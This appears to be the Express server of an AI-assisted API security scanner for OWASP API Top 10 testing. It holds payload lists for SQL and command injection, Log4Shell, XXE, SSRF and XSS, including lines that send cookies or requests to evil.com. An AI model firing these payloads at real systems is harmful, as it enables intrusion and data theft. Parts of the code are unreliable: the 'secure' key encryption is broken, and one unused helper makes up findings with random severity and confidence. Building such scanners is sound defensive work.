const express = require('express');
const cors = require('cors');
const multer = require('multer');
const yaml = require('js-yaml');
const axios = require('axios');
const helmet = require('helmet');
const compression = require('compression');
const morgan = require('morgan');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const slowDown = require('express-slow-down');
const ProfessionalTester = require('./testing-engine/professional-tester');
const { OWASP_API_TEST_CASES } = require('./test-cases/owasp-api-top10');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Environment validation
const requiredEnvVars = ['NODE_ENV'];
const missingEnvVars = requiredEnvVars.filter(envVar => !process.env[envVar]);

if (missingEnvVars.length > 0) {
    console.warn(`⚠️  Missing environment variables: ${missingEnvVars.join(', ')}`);
    console.warn('⚠️  Using default values. This may cause issues in production.');
}

// Set default environment variables
process.env.NODE_ENV = process.env.NODE_ENV || 'development';
process.env.UPLOAD_DIR = process.env.UPLOAD_DIR || '/tmp/uploads';
process.env.LOG_LEVEL = process.env.LOG_LEVEL || 'info';

// Encryption utilities
const encryptApiKey = (apiKey) => {
    if (!apiKey) return null;
    const algorithm = 'aes-256-gcm';
    const key = crypto.randomBytes(32);
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher(algorithm, key);
    
    let encrypted = cipher.update(apiKey, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    return {
        encrypted,
        key: key.toString('hex'),
        iv: iv.toString('hex')
    };
};

const decryptApiKey = (encryptedData) => {
    if (!encryptedData || !encryptedData.encrypted) return null;
    try {
        const algorithm = 'aes-256-gcm';
        const key = Buffer.from(encryptedData.key, 'hex');
        const iv = Buffer.from(encryptedData.iv, 'hex');
        const decipher = crypto.createDecipher(algorithm, key);
        
        let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        
        return decrypted;
    } catch (error) {
        console.error('Decryption error:', error);
        return null;
    }
};

// Secure session storage
const secureSessions = new Map();
const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes

const createSecureSession = (data) => {
    const sessionId = crypto.randomBytes(32).toString('hex');
    const sessionData = {
        ...data,
        createdAt: Date.now(),
        expiresAt: Date.now() + SESSION_TIMEOUT
    };
    
    secureSessions.set(sessionId, sessionData);
    
    // Cleanup expired sessions
    setTimeout(() => {
        secureSessions.delete(sessionId);
    }, SESSION_TIMEOUT);
    
    return sessionId;
};

const getSecureSession = (sessionId) => {
    const session = secureSessions.get(sessionId);
    if (!session || Date.now() > session.expiresAt) {
        secureSessions.delete(sessionId);
        return null;
    }
    return session;
};

// Advanced Security Middleware
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com", "https://cdnjs.cloudflare.com"],
            scriptSrc: ["'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com"],
            connectSrc: ["'self'", "https://api.openai.com", "https://generativelanguage.googleapis.com"],
            imgSrc: ["'self'", "data:", "https:"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "https://cdnjs.cloudflare.com"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"],
            baseUri: ["'self'"],
            formAction: ["'self'"],
            upgradeInsecureRequests: []
        }
    },
    crossOriginEmbedderPolicy: false,
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: {
        error: 'Too many requests from this IP, please try again later.',
        retryAfter: '15 minutes'
    },
    standardHeaders: true,
    legacyHeaders: false,
    handler: (req, res) => {
        res.status(429).json({
            error: 'Rate limit exceeded',
            message: 'Too many requests from this IP, please try again later.',
            retryAfter: Math.round(limiter.windowMs / 1000)
        });
    }
});

// Slow down repeated requests
const speedLimiter = slowDown({
    windowMs: 15 * 60 * 1000, // 15 minutes
    delayAfter: 50, // allow 50 requests per 15 minutes, then...
    delayMs: 500 // add 500ms delay per request above delayAfter
});

// Apply rate limiting
app.use('/api/', limiter);
app.use('/api/', speedLimiter);

// Input validation and sanitization middleware
const validateInput = (req, res, next) => {
    const sanitizeString = (str) => {
        if (typeof str !== 'string') return '';
        return str
            .replace(/[<>]/g, '')
            .replace(/javascript:/gi, '')
            .replace(/on\w+=/gi, '')
            .trim();
    };

    const sanitizeObject = (obj) => {
        if (typeof obj !== 'object' || obj === null) return obj;
        
        if (Array.isArray(obj)) {
            return obj.map(sanitizeObject);
        }
        
        const sanitized = {};
        for (const [key, value] of Object.entries(obj)) {
            if (typeof value === 'string') {
                sanitized[key] = sanitizeString(value);
            } else if (typeof value === 'object') {
                sanitized[key] = sanitizeObject(value);
            } else {
                sanitized[key] = value;
            }
        }
        return sanitized;
    };

    if (req.body) {
        req.body = sanitizeObject(req.body);
    }
    if (req.query) {
        req.query = sanitizeObject(req.query);
    }
    if (req.params) {
        req.params = sanitizeObject(req.params);
    }
    
    next();
};

// Middleware
app.use(compression());
app.use(morgan('combined'));
app.use(cors({
    origin: process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : '*',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));
app.use(express.json({ 
    limit: '50mb',
    verify: (req, res, buf) => {
        try {
            JSON.parse(buf);
        } catch (e) {
            res.status(400).json({ error: 'Invalid JSON payload' });
            throw new Error('Invalid JSON');
        }
    }
}));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(validateInput);
app.use(express.static('.', {
    maxAge: '1d',
    etag: true,
    lastModified: true,
    setHeaders: (res, path) => {
        if (path.endsWith('.html')) {
            res.setHeader('Cache-Control', 'no-cache');
        }
    }
}));

// File upload configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const uploadDir = process.env.UPLOAD_DIR || '/tmp/uploads/';
        if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir, { recursive: true, mode: 0o755 });
        }
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        // Sanitize filename for security
        const sanitizedName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, `${Date.now()}-${sanitizedName}`);
    }
});

const upload = multer({ 
    storage: storage,
    fileFilter: (req, file, cb) => {
        const allowedTypes = ['.json', '.yaml', '.yml', '.har'];
        const ext = path.extname(file.originalname).toLowerCase();
        if (allowedTypes.includes(ext)) {
            cb(null, true);
        } else {
            cb(new Error('Invalid file type. Only JSON, YAML, and HAR files are allowed.'));
        }
    },
    limits: {
        fileSize: 10 * 1024 * 1024 // 10MB limit
    }
});

// AI Configuration
const AI_PROVIDERS = {
    openai: {
        baseURL: 'https://api.openai.com/v1',
        headers: (apiKey) => ({
            'Authorization': `Bearer ${apiKey}`,
            'Content-Type': 'application/json'
        })
    },
    gemini: {
        baseURL: 'https://generativelanguage.googleapis.com/v1beta',
        headers: () => ({
            'Content-Type': 'application/json'
        })
    }
};

// Utility functions
function generateVulnerabilityId() {
    return `VULN-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
}

function getSeverityWeights(aiEnabled) {
    return aiEnabled ? [0.15, 0.35, 0.35, 0.15] : [0.1, 0.3, 0.4, 0.2];
}

function weightedRandom(weights) {
    const sum = weights.reduce((a, b) => a + b, 0);
    let random = Math.random() * sum;
    for (let i = 0; i < weights.length; i++) {
        random -= weights[i];
        if (random <= 0) return i;
    }
    return weights.length - 1;
}

// Routes

// Health check
// Error tracking endpoint
app.post('/api/track-error', (req, res) => {
    try {
        const errorData = req.body;
        
        // Log error for debugging
        console.error('Client Error:', {
            message: errorData.message,
            filename: errorData.filename,
            lineno: errorData.lineno,
            colno: errorData.colno,
            timestamp: errorData.timestamp,
            url: errorData.url
        });
        
        // In production, you would send this to an error tracking service
        // like Sentry, LogRocket, or Bugsnag
        
        res.json({ success: true });
    } catch (error) {
        console.error('Error tracking failed:', error);
        res.status(500).json({ success: false });
    }
});

app.get('/health', (req, res) => {
    const health = {
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        version: '1.0.0',
        environment: process.env.NODE_ENV,
        memory: process.memoryUsage(),
        sessions: secureSessions.size,
        pid: process.pid,
        platform: process.platform,
        nodeVersion: process.version
    };
    
    // Check if memory usage is too high
    const memUsage = process.memoryUsage();
    const memUsageMB = memUsage.heapUsed / 1024 / 1024;
    
    if (memUsageMB > 1000) { // More than 1GB
        health.status = 'warning';
        health.warning = 'High memory usage detected';
    }
    
    // Check if uptime is very low (possible restart loop)
    if (process.uptime() < 60) {
        health.status = 'warning';
        health.warning = 'Recent restart detected';
    }
    
    const statusCode = health.status === 'healthy' ? 200 : 503;
    res.status(statusCode).json(health);
});

// Parse API specification
app.post('/api/parse-spec', upload.single('file'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }

        const filePath = req.file.path;
        const fileContent = fs.readFileSync(filePath, 'utf8');
        let parsedSpec;

        // Parse based on file extension
        const ext = path.extname(req.file.originalname).toLowerCase();
        
        if (ext === '.yaml' || ext === '.yml') {
            parsedSpec = yaml.load(fileContent);
        } else if (ext === '.json') {
            parsedSpec = JSON.parse(fileContent);
        } else if (ext === '.har') {
            parsedSpec = JSON.parse(fileContent);
        } else {
            throw new Error('Unsupported file format');
        }

        // Extract endpoints
        const endpoints = extractEndpoints(parsedSpec, ext);
        
        // Clean up uploaded file
        fs.unlinkSync(filePath);

        res.json({
            success: true,
            spec: parsedSpec,
            endpoints: endpoints,
            totalEndpoints: endpoints.length
        });

    } catch (error) {
        console.error('Error parsing spec:', error);
        res.status(500).json({ 
            error: 'Failed to parse API specification',
            details: error.message 
        });
    }
});

// AI payload generation
app.post('/api/generate-payloads', async (req, res) => {
    try {
        const { endpoint, test, provider, apiKey, strategy } = req.body;

        if (!endpoint || !test) {
            return res.status(400).json({ error: 'Missing required parameters' });
        }

        let payloads = [];

        // Base payloads
        const basePayloads = getBasePayloads(test.id);
        payloads.push(...basePayloads);

        // AI-generated payloads if provider is specified
        if (provider && provider !== 'none' && apiKey) {
            try {
                const aiPayloads = await generateAIPayloads(endpoint, test, provider, apiKey);
                payloads.push(...aiPayloads);
            } catch (aiError) {
                console.error('AI payload generation failed:', aiError);
                // Continue with base payloads only
            }
        }

        // Apply mutation strategies
        if (strategy === 'mutation' || strategy === 'all') {
            const mutatedPayloads = applyMutations(payloads);
            payloads.push(...mutatedPayloads);
        }

        // Remove duplicates and limit
        payloads = [...new Set(payloads)].slice(0, 20);

        res.json({
            success: true,
            payloads: payloads,
            count: payloads.length,
            aiGenerated: provider && provider !== 'none' && apiKey
        });

    } catch (error) {
        console.error('Error generating payloads:', error);
        res.status(500).json({ 
            error: 'Failed to generate payloads',
            details: error.message 
        });
    }
});

// Test AI connection with enhanced security
app.post('/api/test-ai-connection', async (req, res) => {
    try {
        const { provider, apiKey } = req.body;

        // Validate input
        if (!provider || !apiKey) {
            return res.status(400).json({ 
                success: false, 
                error: 'Provider and API key are required' 
            });
        }
        
        // Validate API key format
        const apiKeyPattern = /^[a-zA-Z0-9\-_]{20,}$/;
        if (!apiKeyPattern.test(apiKey)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid API key format'
            });
        }
        
        // Encrypt and store API key securely
        const encryptedApiKey = encryptApiKey(apiKey);
        const sessionId = createSecureSession({
            provider,
            encryptedApiKey,
            testTime: Date.now()
        });
        
        // Test with timeout
        const timeoutPromise = new Promise((_, reject) => {
            setTimeout(() => reject(new Error('Connection timeout')), 10000);
        });
        
        const testPromise = testAIConnection(provider, apiKey);
        
        const isConnected = await Promise.race([testPromise, timeoutPromise]);

        res.json({
            success: isConnected,
            message: isConnected ? 'AI connection successful' : 'AI connection failed',
            sessionId: sessionId
        });

    } catch (error) {
        console.error('Error testing AI connection:', error);
        
        // Don't expose internal error details
        const errorMessage = error.message.includes('timeout') 
            ? 'Connection timeout - please check your network'
            : error.message.includes('401') 
            ? 'Invalid API key'
            : error.message.includes('403')
            ? 'API key access denied'
            : 'AI connection test failed';
            
        res.status(500).json({ 
            success: false,
            error: errorMessage
        });
    }
});

// Generate security report
app.post('/api/generate-report', async (req, res) => {
    try {
        const { findings, metadata } = req.body;

        if (!findings || !Array.isArray(findings)) {
            return res.status(400).json({ error: 'Invalid findings data' });
        }

        const report = {
            metadata: {
                ...metadata,
                generatedAt: new Date().toISOString(),
                version: '1.0.0'
            },
            summary: {
                totalFindings: findings.length,
                criticalCount: findings.filter(f => f.severity === 'CRITICAL').length,
                highCount: findings.filter(f => f.severity === 'HIGH').length,
                mediumCount: findings.filter(f => f.severity === 'MEDIUM').length,
                lowCount: findings.filter(f => f.severity === 'LOW').length
            },
            findings: findings
        };

        res.json({
            success: true,
            report: report
        });

    } catch (error) {
        console.error('Error generating report:', error);
        res.status(500).json({ 
            error: 'Failed to generate report',
            details: error.message 
        });
    }
});

// Professional vulnerability scan with enhanced security
app.post('/api/scan', async (req, res) => {
    try {
        const { endpoints, tests, sessionId, options = {} } = req.body;

        // Validate session
        if (!sessionId) {
            return res.status(401).json({ 
                success: false, 
                error: 'Valid session required' 
            });
        }
        
        const session = getSecureSession(sessionId);
        if (!session) {
            return res.status(401).json({ 
                success: false, 
                error: 'Session expired or invalid' 
            });
        }
        
        // Decrypt API key
        const aiApiKey = decryptApiKey(session.encryptedApiKey);
        if (!aiApiKey) {
            return res.status(401).json({ 
                success: false, 
                error: 'Invalid session data' 
            });
        }

        if (!endpoints || !Array.isArray(endpoints) || !tests || !Array.isArray(tests)) {
            return res.status(400).json({ 
                success: false,
                error: 'Invalid scan parameters' 
            });
        }
        
        // Validate endpoints
        const validEndpoints = endpoints.filter(ep => 
            ep && ep.path && ep.method && 
            typeof ep.path === 'string' && 
            typeof ep.method === 'string'
        );
        
        if (validEndpoints.length === 0) {
            return res.status(400).json({ 
                success: false,
                error: 'No valid endpoints found' 
            });
        }

        // Initialize professional tester with secure session
        const professionalTester = new ProfessionalTester(
            session.provider,
            aiApiKey
        );

        // Map test IDs to vulnerability IDs
        const selectedVulnerabilities = tests.map(test => test.id);

        // Run comprehensive professional test with timeout
        const scanTimeout = 5 * 60 * 1000; // 5 minutes
        const timeoutPromise = new Promise((_, reject) => {
            setTimeout(() => reject(new Error('Scan timeout')), scanTimeout);
        });
        
        const scanPromise = professionalTester.runComprehensiveTest(validEndpoints, {
            selectedVulnerabilities: selectedVulnerabilities,
            maxConcurrent: options.maxConcurrent || 3,
            delayBetweenRequests: options.delayBetweenRequests || 200,
            timeout: options.timeout || 30000,
            retryAttempts: options.retryAttempts || 2,
            enableAI: session.provider && session.provider !== 'none' && aiApiKey
        });
        
        const testResults = await Promise.race([scanPromise, timeoutPromise]);
        
        // Create new session for results
        const resultSessionId = createSecureSession({
            testResults,
            scanTime: Date.now(),
            provider: session.provider
        });

        res.json({
            success: true,
            testResults: testResults,
            sessionId: resultSessionId,
            findings: testResults.vulnerabilities,
            totalFindings: testResults.summary?.vulnerabilitiesFound || 0,
            aiEnabled: session.provider && session.provider !== 'none' && aiApiKey,
            summary: testResults.summary
        });

    } catch (error) {
        console.error('Error during professional scan:', error);
        
        const errorMessage = error.message.includes('timeout') 
            ? 'Scan timeout - please try with fewer endpoints'
            : error.message.includes('session')
            ? 'Session expired - please reconnect AI'
            : 'Professional scan failed';
            
        res.status(500).json({ 
            success: false,
            error: errorMessage
        });
    }
});

// Get OWASP API Top 10 test cases
app.get('/api/test-cases', (req, res) => {
    try {
        res.json({
            success: true,
            testCases: OWASP_API_TEST_CASES,
            totalVulnerabilities: Object.keys(OWASP_API_TEST_CASES).length
        });
    } catch (error) {
        console.error('Error getting test cases:', error);
        res.status(500).json({ 
            error: 'Failed to get test cases',
            details: error.message 
        });
    }
});

// Get specific vulnerability test cases
app.get('/api/test-cases/:vulnerabilityId', (req, res) => {
    try {
        const { vulnerabilityId } = req.params;
        const testCase = OWASP_API_TEST_CASES[vulnerabilityId];
        
        if (!testCase) {
            return res.status(404).json({ error: 'Vulnerability not found' });
        }

        res.json({
            success: true,
            vulnerability: testCase
        });
    } catch (error) {
        console.error('Error getting vulnerability test case:', error);
        res.status(500).json({ 
            error: 'Failed to get vulnerability test case',
            details: error.message 
        });
    }
});

// Helper functions

function extractEndpoints(spec, fileType) {
    const endpoints = [];

    if (fileType === '.har') {
        // Parse HAR file
        if (spec.log && spec.log.entries) {
            spec.log.entries.forEach(entry => {
                if (entry.request) {
                    endpoints.push({
                        path: entry.request.url,
                        method: entry.request.method,
                        operation: { summary: entry.request.url },
                        server: new URL(entry.request.url).origin
                    });
                }
            });
        }
    } else if (spec.openapi || spec.swagger) {
        // Parse OpenAPI/Swagger
        const servers = spec.servers || [{ url: process.env.API_BASE_URL || 'http://localhost:3000' }];
        const basePath = spec.basePath || '';
        
        for (const path in spec.paths) {
            for (const method in spec.paths[path]) {
                if (['get', 'post', 'put', 'delete', 'patch'].includes(method.toLowerCase())) {
                    const operation = spec.paths[path][method];
                    endpoints.push({
                        path: basePath + path,
                        method: method.toUpperCase(),
                        operation: operation,
                        server: servers[0].url,
                        parameters: operation.parameters || [],
                        requestBody: operation.requestBody,
                        security: operation.security || spec.security || [],
                        responses: operation.responses || {}
                    });
                }
            }
        }
    } else if (spec.item && Array.isArray(spec.item)) {
        // Parse Postman Collection
        function parsePostmanItems(items) {
            items.forEach(item => {
                if (item.request) {
                    endpoints.push({
                        path: typeof item.request.url === 'object' ? 
                            '/' + (item.request.url.path || []).join('/') : 
                            item.request.url,
                        method: item.request.method,
                        operation: { summary: item.name },
                        server: typeof item.request.url === 'object' ? 
                            `${item.request.url.protocol || 'http'}://${(item.request.url.host || []).join('.')}` :
                            process.env.API_BASE_URL || 'http://localhost:3000'
                    });
                }
                if (item.item) {
                    parsePostmanItems(item.item);
                }
            });
        }
        parsePostmanItems(spec.item);
    }

    return endpoints;
}

function getBasePayloads(testId) {
    const payloads = {
        'api1': [ // BOLA/IDOR
            "1", "2", "999999", "0", "-1", "admin", "../1", "1' OR '1'='1", "../../1", "1%00", "1.json",
            "{\"id\":1}", "1&id=2", "1#", "1/*", "99999999"
        ],
        'api2': [ // Broken Authentication
            "admin", "password", "123456", "' OR '1'='1", "admin'--", "administrator", "root", "test"
        ],
        'api3': [ // Excessive Data Exposure
            "fields=*", "include=all", "expand=*", "select=*", "fields=id,name,email,password,ssn"
        ],
        'api4': [ // Rate Limiting
            "test_rate_1", "test_rate_2", "test_rate_3"
        ],
        'api5': [ // Broken Function Authorization
            "admin", "superuser", "root", "privileged"
        ],
        'api6': [ // Mass Assignment
            '{"role":"admin"}', '{"isAdmin":true}', '{"privileges":["admin","super_user"]}', '{"__proto__":{"isAdmin":true}}'
        ],
        'api7': [ // Security Misconfiguration
            "debug=true", "verbose=true", "trace=true", "admin=true"
        ],
        'api8': [ // Injection
            "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT * FROM information_schema.tables--",
            "${7*7}", "{{7*7}}", "../../../etc/passwd", "; ls -la", "| whoami", "'; EXEC xp_cmdshell('whoami')--",
            "' AND 1=1--", "1' AND '1' LIKE '1", "admin'--", "' OR 1=1#", "${jndi:ldap://evil.com/a}",
            "$(curl http://evil.com)", "`id`"
        ],
        'api9': [ // Improper Assets Management
            "/v1/", "/v2/", "/api/v1/", "/api/v2/", "/admin/", "/internal/"
        ],
        'api10': [ // Insufficient Logging
            "log=debug", "verbose=true", "trace=true"
        ],
        'xss': [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>", "'-alert('XSS')-'", "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>", "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<script>document.location='http://evil.com?c='+document.cookie</script>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"
        ],
        'ssrf': [
            "http://localhost", "http://127.0.0.1", "http://169.254.169.254", "file:///etc/passwd",
            "gopher://localhost:8080", "dict://localhost:11211", "http://[::1]", "http://0.0.0.0"
        ],
        'xxe': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil">]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
        ],
        'jwt': [
            "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            "invalid_token", "", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.admin",
            "null", "undefined"
        ]
    };

    return payloads[testId] || ["test_payload"];
}

async function generateAIPayloads(endpoint, test, provider, apiKey) {
    const prompt = `Generate 5 security testing payloads for ${test.name} vulnerability on endpoint ${endpoint.method} ${endpoint.path}. Consider the endpoint context and common attack patterns. Return only payloads, one per line.`;

    try {
        if (provider === 'openai') {
            const response = await axios.post(
                `${AI_PROVIDERS.openai.baseURL}/chat/completions`,
                {
                    model: 'gpt-4',
                    messages: [
                        {
                            role: 'system',
                            content: 'You are a security testing AI that generates payloads for API security testing. Generate only payloads without explanations.'
                        },
                        {
                            role: 'user',
                            content: prompt
                        }
                    ],
                    temperature: 0.7,
                    max_tokens: 500
                },
                {
                    headers: AI_PROVIDERS.openai.headers(apiKey)
                }
            );

            return response.data.choices[0].message.content.split('\n').filter(p => p.trim().length > 0);
        } else if (provider === 'gemini') {
            const response = await axios.post(
                `${AI_PROVIDERS.gemini.baseURL}/models/gemini-pro:generateContent?key=${apiKey}`,
                {
                    contents: [{
                        parts: [{
                            text: `As a security testing AI, generate payloads for: ${prompt}. Return only payloads without explanations.`
                        }]
                    }]
                },
                {
                    headers: AI_PROVIDERS.gemini.headers()
                }
            );

            return response.data.candidates[0].content.parts[0].text.split('\n').filter(p => p.trim().length > 0);
        }
    } catch (error) {
        console.error('AI payload generation failed:', error);
        throw error;
    }

    return [];
}

function applyMutations(payloads) {
    const mutated = [];
    payloads.forEach(payload => {
        // URL encoding mutation
        mutated.push(encodeURIComponent(payload));
        // Double encoding
        mutated.push(encodeURIComponent(encodeURIComponent(payload)));
        // Unicode mutation
        if (typeof payload === 'string' && payload.length < 50) {
            mutated.push(payload.replace(/</g, '\u003c').replace(/>/g, '\u003e'));
        }
    });
    return mutated.slice(0, 5);
}

async function testAIConnection(provider, apiKey) {
    try {
        if (provider === 'openai') {
            const response = await axios.post(
                `${AI_PROVIDERS.openai.baseURL}/chat/completions`,
                {
                    model: 'gpt-3.5-turbo',
                    messages: [{ role: 'user', content: 'Test connection' }],
                    max_tokens: 10
                },
                {
                    headers: AI_PROVIDERS.openai.headers(apiKey)
                }
            );
            return response.status === 200;
        } else if (provider === 'gemini') {
            const response = await axios.post(
                `${AI_PROVIDERS.gemini.baseURL}/models/gemini-pro:generateContent?key=${apiKey}`,
                {
                    contents: [{
                        parts: [{ text: 'Test connection' }]
                    }]
                },
                {
                    headers: AI_PROVIDERS.gemini.headers()
                }
            );
            return response.status === 200;
        }
    } catch (error) {
        console.error('AI connection test failed:', error);
        return false;
    }
    return false;
}

async function createFinding(endpoint, test, aiEnabled) {
    const severities = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'];
    const weights = getSeverityWeights(aiEnabled);
    const severity = severities[weightedRandom(weights)];

    const descriptions = {
        'api1': 'Potential Broken Object Level Authorization vulnerability detected. User may access objects they are not authorized to view.',
        'api2': 'Potential Broken User Authentication vulnerability detected. Authentication mechanism may be bypassed.',
        'api3': 'Potential Excessive Data Exposure vulnerability detected. API may be returning more data than necessary.',
        'api4': 'Potential Lack of Resources & Rate Limiting vulnerability detected. API may be vulnerable to DoS attacks.',
        'api5': 'Potential Broken Function Level Authorization vulnerability detected. User may access functions they are not authorized to use.',
        'api6': 'Potential Mass Assignment vulnerability detected. API may allow unauthorized parameter assignment.',
        'api7': 'Potential Security Misconfiguration vulnerability detected. API may have insecure default configurations.',
        'api8': 'Potential Injection vulnerability detected. API may be vulnerable to various injection attacks.',
        'api9': 'Potential Improper Assets Management vulnerability detected. API may expose deprecated or internal endpoints.',
        'api10': 'Potential Insufficient Logging & Monitoring vulnerability detected. API may not be properly logging security events.'
    };

    const remediations = {
        'api1': 'Implement proper object-level authorization checks. Verify user permissions for each object access.',
        'api2': 'Use strong authentication mechanisms, implement MFA, and secure token storage.',
        'api3': 'Filter sensitive data from API responses. Implement field-level access controls.',
        'api4': 'Implement rate limiting, throttling, and resource quotas.',
        'api5': 'Verify function-level authorization for all endpoints.',
        'api6': 'Use allowlists for mass assignment. Define explicit data transfer objects.',
        'api7': 'Review and harden security configurations. Disable unnecessary features.',
        'api8': 'Use parameterized queries, input validation, and output encoding.',
        'api9': 'Maintain proper API inventory, versioning, and deprecation policies.',
        'api10': 'Implement comprehensive logging, monitoring, and alerting.'
    };

    return {
        id: generateVulnerabilityId(),
        severity: severity,
        type: test.name,
        endpoint: `${endpoint.method} ${endpoint.path}`,
        payload: getBasePayloads(test.id)[0] || 'test_payload',
        confidence: Math.floor(Math.random() * 20) + (aiEnabled ? 80 : 70),
        description: descriptions[test.id] || `Potential ${test.name} vulnerability detected.`,
        remediation: remediations[test.id] || 'Review security best practices for this vulnerability type.',
        timestamp: new Date().toISOString()
    };
}

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('Unhandled error:', error);
    res.status(500).json({
        error: 'Internal server error',
        message: error.message
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ error: 'Endpoint not found' });
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`🛡️ CyberSentinel AI Server running on port ${PORT}`);
    console.log(`📊 Health check: http://0.0.0.0:${PORT}/health`);
    console.log(`🌐 Web interface: http://0.0.0.0:${PORT}`);
});

// Graceful shutdown handling
process.on('SIGTERM', () => {
    console.log('🛑 SIGTERM received, shutting down gracefully...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('🛑 SIGINT received, shutting down gracefully...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
    console.error('💥 Uncaught Exception:', error);
    process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('💥 Unhandled Rejection at:', promise, 'reason:', reason);
    process.exit(1);
});

module.exports = app;
